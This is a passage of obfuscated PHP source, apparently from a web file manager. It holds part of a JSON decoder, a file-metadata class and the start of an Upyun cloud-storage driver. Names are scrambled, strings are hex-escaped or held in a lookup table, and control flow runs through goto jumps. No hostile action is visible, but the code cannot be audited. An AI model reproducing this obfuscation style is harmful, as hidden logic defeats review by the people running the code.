{ $a‡ÔŒõéºÃ->{$e…ÒÖ„õë} = $aÌÃÄš•Ú«; } } elseif (preg_match($E¡ÎíĞñ‡Ø[1950], $FÑíÑŸ¿½¯, $d„œ†é÷Ç)) { $e…ÒÖ„õë = $d„œ†é÷Ç[1]; $aÌÃÄš•Ú« = $this->decode($d„œ†é÷Ç[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $a‡ÔŒõéºÃ[$e…ÒÖ„õë] = $aÌÃÄš•Ú«; } else { $a‡ÔŒõéºÃ->{$e…ÒÖ„õë} = $aÌÃÄš•Ú«; } } } } elseif (($aŠ´ˆÎ÷‡[$fÂÜÄ“É¸¡] == $E¡ÎíĞñ‡Ø[113] || $aŠ´ˆÎ÷‡[$fÂÜÄ“É¸¡] == $E¡ÎíĞñ‡Ø[55]) && $e×¦˜õµ[$E¡ÎíĞñ‡Ø[1947]] != SERVICES_JSON_IN_STR) { array_push($Cé’ÎŞğÌ˜, array($E¡ÎíĞñ‡Ø[1947] => SERVICES_JSON_IN_STR, $E¡ÎíĞñ‡Ø[263] => $fÂÜÄ“É¸¡, $E¡ÎíĞñ‡Ø[1948] => $aŠ´ˆÎ÷‡[$fÂÜÄ“É¸¡])); } elseif ($aŠ´ˆÎ÷‡[$fÂÜÄ“É¸¡] == $e×¦˜õµ[$E¡ÎíĞñ‡Ø[1948]] && $e×¦˜õµ[$E¡ÎíĞñ‡Ø[1947]] == SERVICES_JSON_IN_STR && (strlen(substr($aŠ´ˆÎ÷‡, 0, $fÂÜÄ“É¸¡)) - strlen(rtrim(substr($aŠ´ˆÎ÷‡, 0, $fÂÜÄ“É¸¡), $E¡ÎíĞñ‡Ø[93]))) % 2 != 1) { array_pop($Cé’ÎŞğÌ˜); } elseif ($aŠ´ˆÎ÷‡[$fÂÜÄ“É¸¡] == $E¡ÎíĞñ‡Ø[157] && in_array($e×¦˜õµ[$E¡ÎíĞñ‡Ø[1947]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Cé’ÎŞğÌ˜, array($E¡ÎíĞñ‡Ø[1947] => SERVICES_JSON_IN_ARR, $E¡ÎíĞñ‡Ø[263] => $fÂÜÄ“É¸¡, $E¡ÎíĞñ‡Ø[1948] => !1)); } elseif ($aŠ´ˆÎ÷‡[$fÂÜÄ“É¸¡] == $E¡ÎíĞñ‡Ø[478] && $e×¦˜õµ[$E¡ÎíĞñ‡Ø[1947]] == SERVICES_JSON_IN_ARR) { array_pop($Cé’ÎŞğÌ˜); } elseif ($aŠ´ˆÎ÷‡[$fÂÜÄ“É¸¡] == $E¡ÎíĞñ‡Ø[1054] && in_array($e×¦˜õµ[$E¡ÎíĞñ‡Ø[1947]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Cé’ÎŞğÌ˜, array($E¡ÎíĞñ‡Ø[1947] => SERVICES_JSON_IN_OBJ, $E¡ÎíĞñ‡Ø[263] => $fÂÜÄ“É¸¡, $E¡ÎíĞñ‡Ø[1948] => !1)); } elseif ($aŠ´ˆÎ÷‡[$fÂÜÄ“É¸¡] == $E¡ÎíĞñ‡Ø[315] && $e×¦˜õµ[$E¡ÎíĞñ‡Ø[1947]] == SERVICES_JSON_IN_OBJ) { array_pop($Cé’ÎŞğÌ˜); } elseif ($A¶ìàã„÷Ò == $E¡ÎíĞñ‡Ø[1951] && in_array($e×¦˜õµ[$E¡ÎíĞñ‡Ø[1947]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Cé’ÎŞğÌ˜, array($E¡ÎíĞñ‡Ø[1947] => SERVICES_JSON_IN_CMT, $E¡ÎíĞñ‡Ø[263] => $fÂÜÄ“É¸¡, $E¡ÎíĞñ‡Ø[1948] => !1)); $fÂÜÄ“É¸¡++; } elseif ($A¶ìàã„÷Ò == $E¡ÎíĞñ‡Ø[1952] && $e×¦˜õµ[$E¡ÎíĞñ‡Ø[1947]] == SERVICES_JSON_IN_CMT) { array_pop($Cé’ÎŞğÌ˜); $fÂÜÄ“É¸¡++; for ($fò¿Ç£Ê³ = $e×¦˜õµ[$E¡ÎíĞñ‡Ø[263]]; $fò¿Ç£Ê³ <= $fÂÜÄ“É¸¡; ++$fò¿Ç£Ê³) { $aŠ´ˆÎ÷‡ = substr_replace($aŠ´ˆÎ÷‡, $E¡ÎíĞñ‡Ø[50], $fò¿Ç£Ê³, 1); } } } if (reset($Cé’ÎŞğÌ˜) == SERVICES_JSON_IN_ARR) { return $dÆøëïù”×; } elseif (reset($Cé’ÎŞğÌ˜) == SERVICES_JSON_IN_OBJ) { return $a‡ÔŒõéºÃ; } goto c‘–ë®‚­¨; EîĞÈñ÷’ğ: if ($aÎ‰¬•ö»Ô[0] == $E¡ÎíĞñ‡Ø[157]) { $Cé’ÎŞğÌ˜ = array(SERVICES_JSON_IN_ARR); $dÆøëïù”× = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $Cé’ÎŞğÌ˜ = array(SERVICES_JSON_IN_OBJ); $a‡ÔŒõéºÃ = array(); } else { $Cé’ÎŞğÌ˜ = array(SERVICES_JSON_IN_OBJ); $a‡ÔŒõéºÃ = new stdClass(); } } array_push($Cé’ÎŞğÌ˜, array($E¡ÎíĞñ‡Ø[1947] => SERVICES_JSON_SLICE, $E¡ÎíĞñ‡Ø[263] => 0, $E¡ÎíĞñ‡Ø[1948] => !1)); $aŠ´ˆÎ÷‡ = substr($aÎ‰¬•ö»Ô, 1, -1); goto fÆ¾¢éÈ·Ô; fÆ¾¢éÈ·Ô: $aŠ´ˆÎ÷‡ = $this->reduce_string($aŠ´ˆÎ÷‡); if ($aŠ´ˆÎ÷‡ == $E¡ÎíĞñ‡Ø[33]) { if (reset($Cé’ÎŞğÌ˜) == SERVICES_JSON_IN_ARR) { return $dÆøëïù”×; } else { return $a‡ÔŒõéºÃ; } } $DÈÆØŒ¤–´ = strlen($aŠ´ˆÎ÷‡); goto Eò–Åè¦¸å; c‘–ë®‚­¨: } } } function isError($aöˆ§…´Ğš, $aœ èÚ–…Ğ = null) { $E¦Òäğó¸½ =& $_SERVER[í™]; if (class_exists($E¦Òäğó¸½[1953])) { return PEAR::isError($aöˆ§…´Ğš, $aœ èÚ–…Ğ); } elseif (is_object($aöˆ§…´Ğš) && (get_class($aöˆ§…´Ğš) == $E¦Òäğó¸½[1954] || is_subclass_of($aöˆ§…´Ğš, $E¦Òäğó¸½[1954]))) { return !0; } return !1; } } if (class_exists($_SERVER[í™][1955])) { class Services_JSON_Error extends PEAR_Error { function __construct($a½¿‹ç¼îù = "\165\156\x6b\x6e\x6f\167\x6e\40\x65\x72\162\157\x72", $b¾•Ï’À†„ = null, $f¿Ô×–ØÊÁ = null, $Cˆ§œì¯¦ = null, $Fç¥¿¨Ÿ´ = null) { parent::PEAR_Error($a½¿‹ç¼îù, $b¾•Ï’À†„, $f¿Ô×–ØÊÁ, $Cˆ§œì¯¦, $Fç¥¿¨Ÿ´); } } } else { class Services_JSON_Error { function __construct($e‰İ²ÎÇØŞ = "\165\x6e\153\x6e\157\167\156\x20\x65\x72\x72\x6f\x72", $b¶†÷ÅÄ½Å = null, $d¼²‰Ë²‹› = null, $BòøÃ’ÜìÅ = null, $DÖ•›Œ‚ = null) { } } } goto c¬êáŞ…­“; Fè‹ŠÍ²ˆÊ: class GetInfo { private static $fileTypeArray; public static function get($bîåº¼‡´ä) { $F­ˆè¢ŞÉØ = IO::info($bîåº¼‡´ä); return self::infoAdd($F­ˆè¢ŞÉØ); } public static function check() { } public static function infoAdd(&$Dƒèó¢·æñ) { goto eÓÚáï‚÷; E”èî»×Õ: if (!$Dƒèó¢·æñ || $Dƒèó¢·æñ[$FÙ†öíÓ÷[29]] != $FÙ†öíÓ÷[167]) { return; } if (!self::support($Dƒèó¢·æñ[$FÙ†öíÓ÷[160]]) || isset($Dƒèó¢·æñ[$FÙ†öíÓ÷[426]])) { return; } $CœÕ¼Üéâº = $FÙ†öíÓ÷[1599] . $Dƒèó¢·æñ[$FÙ†öíÓ÷[75]]; goto CÛ”˜ÔÔ¤¨; cÏï§Èã¡: $a”ïç…à„» = self::arrayValueLimit($a”ïç…à„»); $a”ïç…à„»[$FÙ†öíÓ÷[372]] = $CÈ¬ƒ…˜³›; $Dƒèó¢·æñ[$FÙ†öíÓ÷[426]] = $a”ïç…à„»; goto fæˆŸîÌµ¤; fæˆŸîÌµ¤: return $Dƒèó¢·æñ; goto fÄ«ˆò£ÈÆ; eÓÚáï‚÷: $FÙ†öíÓ÷ =& $_SERVER[í™]; static $a–›Åíà‘; if (!$a–›Åíà‘) { require SDK_DIR . $FÙ†öíÓ÷[1598]; $a–›Åíà‘ = new getID3(); } goto E”èî»×Õ; CÛ”˜ÔÔ¤¨: $CÈ¬ƒ…˜³› = $Dƒèó¢·æñ[$FÙ†öíÓ÷[160]]; try { if ($Dƒèó¢·æñ[$FÙ†öíÓ÷[160]] == $FÙ†öíÓ÷[1600]) { $a”ïç…à„» = self::psdParse($CœÕ¼Üéâº); $CÈ¬ƒ…˜³› = $FÙ†öíÓ÷[1601]; } else { if ($Dƒèó¢·æñ[$FÙ†öíÓ÷[160]] == $FÙ†öíÓ÷[1602]) { $a”ïç…à„» = self::pdfParse($CœÕ¼Üéâº); } else { $CÈ¬ƒ…˜³› = self::$fileTypeArray[$FÙ†öíÓ÷[1603]][$Dƒèó¢·æñ[$FÙ†öíÓ÷[160]]]; $eªùÏÙ¤Æ = self::$fileTypeArray[$FÙ†öíÓ÷[1604]][$CÈ¬ƒ…˜³›][$FÙ†öíÓ÷[1605]]; $aâÔ’Ñ®˜ñ = @$a–›Åíà‘->analyze($CœÕ¼Üéâº, $Dƒèó¢·æñ[$FÙ†öíÓ÷[77]], $Dƒèó¢·æñ[$FÙ†öíÓ÷[28]]); $a”ïç…à„» = self::parseData($aâÔ’Ñ®˜ñ, $eªùÏÙ¤Æ, $Dƒèó¢·æñ); } } } catch (Exception $E†ä£ƒáà) { $a”ïç…à„» = array($FÙ†öíÓ÷[372] => $CÈ¬ƒ…˜³›); } if (!$a”ïç…à„») { return; } goto cÏï§Èã¡; fÄ«ˆò£ÈÆ: } public static function support($aËîòŞ…È­) { goto F¿ŒÄâ¹¬¢; c…ÛÌ©‘±: $f’¤Šë˜ôÖ = array($d‡¯ÊÄëª’[1602], $d‡¯ÊÄëª’[1600]); if (in_array($aËîòŞ…È­, $f’¤Šë˜ôÖ)) { return !0; } if (isset(self::$fileTypeArray[$d‡¯ÊÄëª’[1603]][$aËîòŞ…È­])) { return !0; } goto b Ş­â¼µ·; F¿ŒÄâ¹¬¢: $d‡¯ÊÄëª’ =& $_SERVER[í™]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $aËîòŞ…È­ = strtolower($aËîòŞ…È­); goto c…ÛÌ©‘±; b Ş­â¼µ·: return !1; goto fçù·£Ë“‹; fçù·£Ë“‹: } public static function arrayValueLimit($FƒÊÛ¼ƒò¥, $b¨¾£å´Š = 5000) { if (!is_array($FƒÊÛ¼ƒò¥)) { return $FƒÊÛ¼ƒò¥; } foreach ($FƒÊÛ¼ƒò¥ as $EºÊÆÏéÊ‰ => $a£½ˆà¥ì) { if (is_string($a£½ˆà¥ì) && strlen($a£½ˆà¥ì) > $b¨¾£å´Š) { $FƒÊÛ¼ƒò¥[$EºÊÆÏéÊ‰] = substr($a£½ˆà¥ì, 0, $b¨¾£å´Š); } else { if (is_array($a£½ˆà¥ì)) { $FƒÊÛ¼ƒò¥[$EºÊÆÏéÊ‰] = self::arrayValueLimit($a£½ˆà¥ì, $b¨¾£å´Š); } } } return $FƒÊÛ¼ƒò¥; } private static function parseData($fïÄœ¡”Ø´, $fó‡¯‹ê÷Ú, $e¿àƒ¬ğš¹) { $dÅ¹”ÕÎˆ¡ =& $_SERVER[í™]; $d‹¥«¶Îâ = $fïÄœ¡”Ø´[$dÅ¹”ÕÎˆ¡[1606]]; $d„„ ¶ÀÊë = array(); foreach ($fó‡¯‹ê÷Ú as $aİäĞØ¥æ => $FÃ³ªœÉ‰Ê) { foreach ($FÃ³ªœÉ‰Ê as $D©¡®³’í) { if (is_array($D©¡®³’í)) { $aßÔ¤Æª¯ë = self::parseData($fïÄœ¡”Ø´, $FÃ³ªœÉ‰Ê, $e¿àƒ¬ğš¹); if ($aßÔ¤Æª¯ë) { $d„„ ¶ÀÊë[$aİäĞØ¥æ] = $aßÔ¤Æª¯ë; } break; } $B‚æŒÅ°ö” = str_replace($dÅ¹”ÕÎˆ¡[1376], $d‹¥«¶Îâ, $D©¡®³’í); $aßÔ¤Æª¯ë = _get($fïÄœ¡”Ø´, $B‚æŒÅ°ö”); $aßÔ¤Æª¯ë = is_array($aßÔ¤Æª¯ë) ? $aßÔ¤Æª¯ë[0] : $aßÔ¤Æª¯ë; if ($aßÔ¤Æª¯ë) { break; } } if ($aßÔ¤Æª¯ë || $aßÔ¤Æª¯ë === 0 || $aßÔ¤Æª¯ë === !1) { $aßÔ¤Æª¯ë = self::valueReset($D©¡®³’í, $aßÔ¤Æª¯ë, $aİäĞØ¥æ); if ($aßÔ¤Æª¯ë !== null) { $d„„ ¶ÀÊë[$aİäĞØ¥æ] = $aßÔ¤Æª¯ë; } } } $d„„ ¶ÀÊë = self::valueResetAll($d„„ ¶ÀÊë, $e¿àƒ¬ğš¹); return $d„„ ¶ÀÊë; } private static function psdParse($DÌ·»çƒ³) { $B·÷¬¯•ƒ =& $_SERVER[í™]; if (IO::fileSubstr($DÌ·»çƒ³, 0, 4) != $B·÷¬¯•ƒ[1607]) { return !1; } $fËœ¦Ÿâ§ = getImageSize($DÌ·»çƒ³, $Añ´¸´¨“ø); if (!$fËœ¦Ÿâ§) { return; } $Cø·Ñİ¾ë„ = array($B·÷¬¯•ƒ[1522] => $fËœ¦Ÿâ§[0], $B·÷¬¯•ƒ[1524] => $fËœ¦Ÿâ§[1]); return $Cø·Ñİ¾ë„; } private static function pdfParse($E»××ÖÉ®) { return FileParsePdf::parse($E»××ÖÉ®); } private static function fileTypeParse() { $Eá‡ØÂÕÌ¸ =& $_SERVER[í™]; $böù—¼•Üß = self::fileTypeArray(); $cø³¶Õ´„ğ = array(); foreach ($böù—¼•Üß as $C·¨µ„¯Š => $A‰Ã§ÔÓ³) { $dòÛÂ¨äò = _get($A‰Ã§ÔÓ³, $Eá‡ØÂÕÌ¸[160], $Eá‡ØÂÕÌ¸[33]); $a·¬¥Èë°× = is_string($dòÛÂ¨äò) ? explode($Eá‡ØÂÕÌ¸[47], $dòÛÂ¨äò) : $dòÛÂ¨äò; if (!$a·¬¥Èë°×) { continue; } foreach ($a·¬¥Èë°× as $dòÛÂ¨äò) { $dòÛÂ¨äò = strtolower(trim($dòÛÂ¨äò)); if (!$dòÛÂ¨äò) { continue; } $cø³¶Õ´„ğ[$dòÛÂ¨äò] = $C·¨µ„¯Š; } $böù—¼•Üß[$C·¨µ„¯Š][$Eá‡ØÂÕÌ¸[160]] = array_keys($cø³¶Õ´„ğ); $böù—¼•Üß[$C·¨µ„¯Š][$Eá‡ØÂÕÌ¸[1605]] = self::parseKeyMap($A‰Ã§ÔÓ³[$Eá‡ØÂÕÌ¸[1605]]); } return array($Eá‡ØÂÕÌ¸[1604] => $böù—¼•Üß, $Eá‡ØÂÕÌ¸[1603] => $cø³¶Õ´„ğ); } private static function parseKeyMap($EÁ„ç™Å­ó) { $E¶¥•÷‰‹‡ =& $_SERVER[í™]; foreach ($EÁ„ç™Å­ó as $A¥÷Ü™®Ç¥ => $AÄóĞÅ¨´) { if (is_array($AÄóĞÅ¨´)) { $e¢ãĞĞ…ï¯ = self::parseKeyMap($AÄóĞÅ¨´); if ($e¢ãĞĞ…ï¯) { $EÁ„ç™Å­ó[$A¥÷Ü™®Ç¥] = $e¢ãĞĞ…ï¯; } continue; } $cœ‹Ş¥ ø‚ = explode($E¶¥•÷‰‹‡[47], $AÄóĞÅ¨´); $BË…öì´Ì = array(); foreach ($cœ‹Ş¥ ø‚ as $fÄ¯•šÉ§ï) { $fÄ¯•šÉ§ï = trim($fÄ¯•šÉ§ï); if (!$fÄ¯•šÉ§ï) { continue; } if (preg_match($E¶¥•÷‰‹‡[1608], $fÄ¯•šÉ§ï, $a·ØÏöïòï)) { $Eöê“‹®æ = explode($E¶¥•÷‰‹‡[271], $a·ØÏöïòï[1]); foreach ($Eöê“‹®æ as $f‘µâ‚ÜÓá) { $BË…öì´Ì[] = str_replace($a·ØÏöïòï[0], $f‘µâ‚ÜÓá, $fÄ¯•šÉ§ï); } } else { $BË…öì´Ì[] = $fÄ¯•šÉ§ï; } } $EÁ„ç™Å­ó[$A¥÷Ü™®Ç¥] = $BË…öì´Ì; } return $EÁ„ç™Å­ó; } private static function valueResetAll($d×ñî¿•Èã, $Fœ©ÄŸ­Ô) { goto BÏæ°ˆ®‡æ; EõÔ¦÷¿½: $BæÙİ‡£Ìì = _get($d×ñî¿•Èã, $AÒ·ÌÉ‹ì[1621], $AÒ·ÌÉ‹ì[33]); $D¡ôÂ˜†ì = $DóÃ·”‡Õ² . $dÒå«ˆ–³Å . $BæÙİ‡£Ìì; if ($D¡ôÂ˜†ì && get_charset($D¡ôÂ˜†ì) != $AÒ·ÌÉ‹ì[326]) { $d×ñî¿•Èã[$AÒ·ÌÉ‹ì[1618]][$AÒ·ÌÉ‹ì[1328]] = iconv_to($d×ñî¿•Èã[$AÒ·ÌÉ‹ì[1618]][$AÒ·ÌÉ‹ì[1328]], get_charset($D¡ôÂ˜†ì), $AÒ·ÌÉ‹ì[326]); $d×ñî¿•Èã[$AÒ·ÌÉ‹ì[1618]][$AÒ·ÌÉ‹ì[1622]] = iconv_to($d×ñî¿•Èã[$AÒ·ÌÉ‹ì[1618]][$AÒ·ÌÉ‹ì[1622]], get_charset($D¡ôÂ˜†ì), $AÒ·ÌÉ‹ì[326]); $d×ñî¿•Èã[$AÒ·ÌÉ‹ì[1618]][$AÒ·ÌÉ‹ì[1623]] = iconv_to($d×ñî¿•Èã[$AÒ·ÌÉ‹ì[1618]][$AÒ·ÌÉ‹ì[1623]], get_charset($D¡ôÂ˜†ì), $AÒ·ÌÉ‹ì[326]); } goto bœåÌ”ï†; BÏæ°ˆ®‡æ: $AÒ·ÌÉ‹ì =& $_SERVER[í™]; if (isset($d×ñî¿•Èã[$AÒ·ÌÉ‹ì[1609]])) { $EÙŸòğì¹İ = ceil($d×ñî¿•Èã[$AÒ·ÌÉ‹ì[1609]]); $C¼ãê‘¨†š = intval($EÙŸòğì¹İ / 3600); $aöÅƒ¹çê² = intval(($EÙŸòğì¹İ - $C¼ãê‘¨†š * 3600) / 60); $b‹Ã•Şâ´® = $EÙŸòğì¹İ % 60; $d×ñî¿•Èã[$AÒ·ÌÉ‹ì[1610]] = sprintf($AÒ·ÌÉ‹ì[1611], $C¼ãê‘¨†š, $aöÅƒ¹çê², $b‹Ã•Şâ´®); if ($C¼ãê‘¨†š == 0) { $d×ñî¿•Èã[$AÒ·ÌÉ‹ì[1610]] = sprintf($AÒ·ÌÉ‹ì[1612], $aöÅƒ¹çê², $b‹Ã•Şâ´®); } } $Få‰ÇÀ…å¨ = _get($d×ñî¿•Èã, $AÒ·ÌÉ‹ì[1613]); goto EÉ÷ÔëÆ¼; EÉ÷ÔëÆ¼: if ($Få‰ÇÀ…å¨) { $D¶“šÂß• = IO_PATH_SYSTEM_TEMP . $AÒ·ÌÉ‹ì[1614] . KodIO::hashPath($Fœ©ÄŸ­Ô) . $AÒ·ÌÉ‹ì[1615]; $d×ñî¿•Èã[$AÒ·ÌÉ‹ì[1616]] = Action($AÒ·ÌÉ‹ì[1617])->pluginCacheFileSet($D¶“šÂß•, $Få‰ÇÀ…å¨); unset($d×ñî¿•Èã[$AÒ·ÌÉ‹ì[1618]][$AÒ·ÌÉ‹ì[1601]]); } $DóÃ·”‡Õ² = _get($d×ñî¿•Èã, $AÒ·ÌÉ‹ì[1619], $AÒ·ÌÉ‹ì[33]); $dÒå«ˆ–³Å = _get($d×ñî¿•Èã, $AÒ·ÌÉ‹ì[1620], $AÒ·ÌÉ‹ì[33]); goto EõÔ¦÷¿½; bœåÌ”ï†: return $d×ñî¿•Èã; goto BÍŸ‹‰ Ó”; BÍŸ‹‰ Ó”: } private static function valueReset($bÁ¹ÕÜ†’, $B«ì¢„ù, $C¡Ëƒ„È©İ) { $Eã—ŠçÙÂ =& $_SERVER[í™]; $AíÎ§¶¢‰í = $Eã—ŠçÙÂ[1539]; switch ($bÁ¹ÕÜ†’) { case $Eã—ŠçÙÂ[1624]: $B«ì¢„ù = $B«ì¢„ù == $Eã—ŠçÙÂ[83] ? $Eã—ŠçÙÂ[1625] : $Eã—ŠçÙÂ[1626]; break; case $Eã—ŠçÙÂ[1627]: $B«ì¢„ù = $B«ì¢„ù ? $B«ì¢„ù : null; break; default: break; } switch ($C¡Ëƒ„È©İ) { case $Eã—ŠçÙÂ[1628]: $B«ì¢„ù = round($B«ì¢„ù, 2); break; case $Eã—ŠçÙÂ[187]: case $Eã—ŠçÙÂ[107]: if ($B«ì¢„ù < 0) { $B«ì¢„ù = null; } else { if (is_numeric($B«ì¢„ù)) { $B«ì¢„ù = date($AíÎ§¶¢‰í, $B«ì¢„ù); } } break; default: break; } return $B«ì¢„ù; } private static function fileTypeArray() { $a¥ÉŒÅÇ­ã =& $_SERVER[í™]; return array($a¥ÉŒÅÇ­ã[1601] => array($a¥ÉŒÅÇ­ã[160] => $a¥ÉŒÅÇ­ã[1629] . $a¥ÉŒÅÇ­ã[1630], $a¥ÉŒÅÇ­ã[1605] => array($a¥ÉŒÅÇ­ã[1522] => $a¥ÉŒÅÇ­ã[1631], $a¥ÉŒÅÇ­ã[1524] => $a¥ÉŒÅÇ­ã[1632], $a¥ÉŒÅÇ­ã[1633] => $a¥ÉŒÅÇ­ã[1634], $a¥ÉŒÅÇ­ã[1635] => $a¥ÉŒÅÇ­ã[1636], $a¥ÉŒÅÇ­ã[187] => $a¥ÉŒÅÇ­ã[1637], $a¥ÉŒÅÇ­ã[107] => $a¥ÉŒÅÇ­ã[1638], $a¥ÉŒÅÇ­ã[1639] => $a¥ÉŒÅÇ­ã[1640], $a¥ÉŒÅÇ­ã[1641] => $a¥ÉŒÅÇ­ã[1642], $a¥ÉŒÅÇ­ã[1643] => $a¥ÉŒÅÇ­ã[1644], $a¥ÉŒÅÇ­ã[1645] => $a¥ÉŒÅÇ­ã[1646], $a¥ÉŒÅÇ­ã[1647] => $a¥ÉŒÅÇ­ã[1648], $a¥ÉŒÅÇ­ã[1649] => $a¥ÉŒÅÇ­ã[1650], $a¥ÉŒÅÇ­ã[1651] => $a¥ÉŒÅÇ­ã[1652], $a¥ÉŒÅÇ­ã[1653] => array($a¥ÉŒÅÇ­ã[1654] => $a¥ÉŒÅÇ­ã[1655], $a¥ÉŒÅÇ­ã[1656] => $a¥ÉŒÅÇ­ã[1657], $a¥ÉŒÅÇ­ã[1658] => $a¥ÉŒÅÇ­ã[1659]), $a¥ÉŒÅÇ­ã[1660] => $a¥ÉŒÅÇ­ã[1661], $a¥ÉŒÅÇ­ã[1662] => $a¥ÉŒÅÇ­ã[1663], $a¥ÉŒÅÇ­ã[1664] => $a¥ÉŒÅÇ­ã[1665], $a¥ÉŒÅÇ­ã[1666] => $a¥ÉŒÅÇ­ã[1667], $a¥ÉŒÅÇ­ã[1668] => array($a¥ÉŒÅÇ­ã[1669] => $a¥ÉŒÅÇ­ã[1670], $a¥ÉŒÅÇ­ã[1671] => $a¥ÉŒÅÇ­ã[1672], $a¥ÉŒÅÇ­ã[1673] => $a¥ÉŒÅÇ­ã[1674], $a¥ÉŒÅÇ­ã[1675] => $a¥ÉŒÅÇ­ã[1676], $a¥ÉŒÅÇ­ã[1677] => $a¥ÉŒÅÇ­ã[1678], $a¥ÉŒÅÇ­ã[1679] => $a¥ÉŒÅÇ­ã[1680], $a¥ÉŒÅÇ­ã[1681] => $a¥ÉŒÅÇ­ã[1682], $a¥ÉŒÅÇ­ã[1683] => $a¥ÉŒÅÇ­ã[1684], $a¥ÉŒÅÇ­ã[1685] => $a¥ÉŒÅÇ­ã[1686], $a¥ÉŒÅÇ­ã[1687] => $a¥ÉŒÅÇ­ã[1688], $a¥ÉŒÅÇ­ã[1689] => $a¥ÉŒÅÇ­ã[1690]))), $a¥ÉŒÅÇ­ã[1691] => array($a¥ÉŒÅÇ­ã[160] => $a¥ÉŒÅÇ­ã[1692] . $a¥ÉŒÅÇ­ã[1693], $a¥ÉŒÅÇ­ã[1605] => array($a¥ÉŒÅÇ­ã[1609] => $a¥ÉŒÅÇ­ã[1694], $a¥ÉŒÅÇ­ã[187] => $a¥ÉŒÅÇ­ã[1695], $a¥ÉŒÅÇ­ã[107] => $a¥ÉŒÅÇ­ã[1696], $a¥ÉŒÅÇ­ã[1641] => $a¥ÉŒÅÇ­ã[1697], $a¥ÉŒÅÇ­ã[1698] => $a¥ÉŒÅÇ­ã[1699], $a¥ÉŒÅÇ­ã[1700] => $a¥ÉŒÅÇ­ã[1627], $a¥ÉŒÅÇ­ã[1701] => $a¥ÉŒÅÇ­ã[1702], $a¥ÉŒÅÇ­ã[1703] => $a¥ÉŒÅÇ­ã[1704], $a¥ÉŒÅÇ­ã[1705] => $a¥ÉŒÅÇ­ã[1706], $a¥ÉŒÅÇ­ã[1618] => array($a¥ÉŒÅÇ­ã[1328] => $a¥ÉŒÅÇ­ã[1707], $a¥ÉŒÅÇ­ã[1622] => $a¥ÉŒÅÇ­ã[1708], $a¥ÉŒÅÇ­ã[1623] => $a¥ÉŒÅÇ­ã[1709], $a¥ÉŒÅÇ­ã[1710] => $a¥ÉŒÅÇ­ã[1711], $a¥ÉŒÅÇ­ã[1712] => $a¥ÉŒÅÇ­ã[1713], $a¥ÉŒÅÇ­ã[1714] => $a¥ÉŒÅÇ­ã[1715], $a¥ÉŒÅÇ­ã[1601] => $a¥ÉŒÅÇ­ã[1716]))), $a¥ÉŒÅÇ­ã[1717] => array($a¥ÉŒÅÇ­ã[160] => $a¥ÉŒÅÇ­ã[1718] . $a¥ÉŒÅÇ­ã[1719], $a¥ÉŒÅÇ­ã[1605] => array($a¥ÉŒÅÇ­ã[1522] => $a¥ÉŒÅÇ­ã[1720], $a¥ÉŒÅÇ­ã[1524] => $a¥ÉŒÅÇ­ã[1721], $a¥ÉŒÅÇ­ã[1609] => $a¥ÉŒÅÇ­ã[1694], $a¥ÉŒÅÇ­ã[187] => $a¥ÉŒÅÇ­ã[1722], $a¥ÉŒÅÇ­ã[107] => $a¥ÉŒÅÇ­ã[1723], $a¥ÉŒÅÇ­ã[1628] => $a¥ÉŒÅÇ­ã[1724], $a¥ÉŒÅÇ­ã[1705] => $a¥ÉŒÅÇ­ã[1725], $a¥ÉŒÅÇ­ã[1701] => $a¥ÉŒÅÇ­ã[1726], $a¥ÉŒÅÇ­ã[1641] => $a¥ÉŒÅÇ­ã[1727], $a¥ÉŒÅÇ­ã[1691] => array($a¥ÉŒÅÇ­ã[1700] => $a¥ÉŒÅÇ­ã[1627], $a¥ÉŒÅÇ­ã[1728] => $a¥ÉŒÅÇ­ã[1729], $a¥ÉŒÅÇ­ã[1698] => $a¥ÉŒÅÇ­ã[1699], $a¥ÉŒÅÇ­ã[1705] => $a¥ÉŒÅÇ­ã[1706], $a¥ÉŒÅÇ­ã[1701] => $a¥ÉŒÅÇ­ã[1730], $a¥ÉŒÅÇ­ã[1703] => $a¥ÉŒÅÇ­ã[1704]))), $a¥ÉŒÅÇ­ã[1731] => array($a¥ÉŒÅÇ­ã[1605] => array($a¥ÉŒÅÇ­ã[1732] => $a¥ÉŒÅÇ­ã[1733], $a¥ÉŒÅÇ­ã[1734] => $a¥ÉŒÅÇ­ã[1735])), $a¥ÉŒÅÇ­ã[1736] => array($a¥ÉŒÅÇ­ã[1605] => array())); } } function exif_read_data_io($E­’ƒ«¥¦ª, $bæ“…ËÙ«« = null, $Dõß÷‰…‡Ã = false, $C±æù‰¾ = false) { $dâ­ø¡ô® = StreamWrapperIO::read($E­’ƒ«¥¦ª, 0, 1024 * 64); $aï…ñÉŞäÉ = $_SERVER[í™][1737] . base64_encode($dâ­ø¡ô®); return exif_read_data($aï…ñÉŞäÉ, $bæ“…ËÙ««, $Dõß÷‰…‡Ã, $C±æù‰¾); } function getimagesize_io($eÓÄÕ¬œ±ç, &$EŞÈÏò‡¥Š = false) { $e¢•Ÿ²ÑÓ = StreamWrapperIO::read($eÓÄÕ¬œ±ç, 0, 1024 * 64); $eÓÄÕ¬œ±ç = $_SERVER[í™][1737] . base64_encode($e¢•Ÿ²ÑÓ); return getimagesize($eÓÄÕ¬œ±ç, $EŞÈÏò‡¥Š); } goto bæ…Ä×‡«¯; D„ŠÏÁŞÕ¢: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\x74\160\x3a\57\57\x76\x30\x2e\141\160\151\x2e\x75\160\171\165\156\56\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($C¬ŠŒãì’Ş) { parent::__construct(); $this->_init($C¬ŠŒãì’Ş); } public function _init($DĞØŒ‰§“) { foreach ($DĞØŒ‰§“ as $C¦¼Ë¸ÙÍß => $B¯Î±‡î¢ø) { if (isset($this->{$C¦¼Ë¸ÙÍß})) { $this->{$C¦¼Ë¸ÙÍß} = $B¯Î±‡î¢ø; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[í™][1227], !1); } } public function setBucketCors() { return 